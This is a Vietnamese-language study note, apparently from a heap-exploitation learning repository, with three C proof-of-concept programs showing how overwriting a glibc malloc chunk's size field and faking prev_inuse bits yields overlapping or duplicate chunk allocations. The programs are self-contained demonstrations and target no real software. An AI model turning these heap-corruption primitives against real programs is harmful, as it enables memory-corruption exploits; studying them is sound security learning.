# Overlap

Lấy cảm hứng từ [overlapping chunk](https://github.com/shellphish/how2heap/blob/master/glibc_2.38/overlapping_chunks.c) trên how2heap, dùng để overlapping memory của 2 chunk trong heap. Trên how2heap là trường hợp đặc biệt overlapping nguyên 1 chunk nên không cần set up đoạn `prev_inuse` bit (do next chunk của next chunk chắc chắn có bật `prev_inuse`). POC này sẽ là overlap một phần của chunk.

Code:

```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <assert.h>

int main(int argc , char* argv[])
{
   setbuf(stdout, NULL);

   long *p1,*p2,*p3,*p4;

   p1 = malloc(0x80 - 0x10); // this chunk is for fun
   p2 = malloc(0x500 - 0x10);
   p3 = malloc(0x80 - 0x10);

   // lets overlapping about 0x30 bytes of chunk p2 and p3

   int evil_chunk_size = 0x531;
   int evil_region_size = 0x530 - 0x10;

   /* VULNERABILITY */
   *(p2 - 1) = evil_chunk_size; // we are overwriting the "size" field of chunk p2
   /* VULNERABILITY */

   *(p3 + 5) = 0x21;
   *(p3 + 9) = 0x101; // it checks ((the prev_inuse bit of the next chunk) of the next chunk) so fake this (size doesnt matter, only the bit)

   free(p2);

   p4 = malloc(evil_region_size);

   // p4 (old is p2) and p3 now overlap
   if(p3 < p4 + evil_region_size) puts("True");
}
```

Tác dụng cũng tương tự [Fwd Consolidation](malloc/fwd_consolidation/readme.md)  "to get overlapping memory" nhưng không dùng gì đến cosolidation. 

# Reallocate

Trong trường hợp đặc biệt như how2heap (overlapping toàn bộ chunk) nếu dùng cẩn thận vẫn có thể " to reallocate a chunk that wasn't freed". POC:

```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <assert.h>

int main(int argc , char* argv[])
{
   setbuf(stdout, NULL);

   long *p1,*p2,*p3,*p4, *p5;

   p1 = malloc(0x80 - 0x10); // this chunk is for fun
   p2 = malloc(0x500 - 0x10);
   p3 = malloc(0x80 - 0x10);
   malloc(0x20); // guard chunk

   // lets overlapping about 0x30 bytes of chunk p2 and p3

   int evil_chunk_size = 0x581;
   int evil_region_size = 0x580 - 0x10;

   /* VULNERABILITY */
   *(p2 - 1) = evil_chunk_size; // we are overwriting the "size" field of chunk p2
   /* VULNERABILITY */

   free(p2);

   p4 = malloc(evil_region_size);

   // now p4 overlapping with p3 (actually contain the whole p3)

   free(p4);
   malloc(0x500 - 0x10);
   p5 = malloc(0x80 - 0x10);

   // now p3 and p5 are the same chunk
   if(p3 == p5) puts("True");
}
```

Và trong trường hợp không đặc biệt (overlapping một phần của chunk) vẫn có thể reallocate về cùng một pointer nhưng lúc đó chunk size sẽ khác nhau. POC:

```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <assert.h>

int main(int argc , char* argv[])
{
   setbuf(stdout, NULL);

   long *p1,*p2,*p3,*p4, *p5;

   p1 = malloc(0x80 - 0x10); // this chunk is for fun
   p2 = malloc(0x500 - 0x10);
   p3 = malloc(0x80 - 0x10);

   // lets overlapping about 0x30 bytes of chunk p2 and p3

   int evil_chunk_size = 0x531;
   int evil_region_size = 0x530 - 0x10;

   /* VULNERABILITY */
   *(p2 - 1) = evil_chunk_size; // we are overwriting the "size" field of chunk p2
   /* VULNERABILITY */

   *(p3 + 5) = 0x21;
   *(p3 + 9) = 0x101; // it checks ((the prev_inuse bit of the next chunk) of the next chunk) so fake this (size doesnt matter, only the bit)

   free(p2);

   p4 = malloc(evil_region_size);

   // p4 (old is p2) and p3 now overlap
   
   free(p4);
   malloc(0x500 - 0x10);
   p5 = malloc(0x30 - 0x10);

   // now p3 and p5 is the same pointer, but chunk size of p3 is 0x80 and p5 is 0x30
   if(p3 == p5) puts("True");
}
```